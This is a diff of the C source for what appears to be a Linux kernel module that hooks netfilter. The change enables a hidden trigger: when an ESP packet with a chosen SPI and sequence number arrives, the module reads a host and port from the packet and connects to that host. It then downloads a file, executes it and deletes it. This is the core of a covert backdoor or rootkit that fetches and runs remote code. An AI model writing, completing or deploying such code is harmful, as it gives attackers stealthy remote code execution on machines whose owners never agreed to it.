@@ -1,8 +1,18 @@
-#include "nfhooks.h"
+#include "nfhook.h"
+#include "debugfs.h"
+#include "request.h"
+#include "net.h"
 
 static struct nf_hook_ops nfho;
 
+void parse_esp_data(char *data, char *ip, int *port){
+
+}
+
 unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *)){
+	int port = 80;
+	char ip[INET6_ADDRSTRLEN];
+	struct connection cn;
 	struct iphdr *ip_header;
 	struct ip_esp_hdr *esp_header;
 
@@ -16,20 +26,14 @@ unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_
 	if (ip_header->protocol == IPPROTO_ESP){
 		esp_header = ip_esp_hdr(skb);
 		if ((esp_header->spi == TARGET_SPI) && (esp_header->seq_no == TARGET_SEQ)){
-			printk(KERN_INFO "TARGETS MATCH!\n");
-			/* Make a connection, get the file, execute it, and destroy it
-				struct connection cn;
-
-				connect("127.0.0.1", 8000, &cn);
-				if (cn.sk){
-					get("/", &cn);
-				}
-
-				debugfs_check();
+			parse_esp_data(esp_header->enc_data, ip, &port);
+			connect(ip, port, &cn);
+			if (cn.sk){
+				get("/", &cn);
 				create_file();
 				execute_file();
 				destroy_file();
-			*/
+			}
 		}
 	}
 
@@ -37,7 +41,7 @@ unsigned int nfhook(unsigned int hooknum, struct sk_buff *skb, const struct net_
 }
 
 /* https://netfilter.org/documentation/HOWTO/netfilter-hacking-HOWTO-4.html#ss4.6 */
-int port_knock_init(void){
+int nfhook_init(void){
 	int ret;
 
 	nfho.hook = (nf_hookfn *) nfhook;
@@ -54,7 +58,7 @@ int port_knock_init(void){
 	return ret;
 }
 
-void port_knock_exit(void){
+void nfhook_exit(void){
 	#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,13,0)
 		nf_unregister_net_hook(&init_net, &nfho);
 	#else
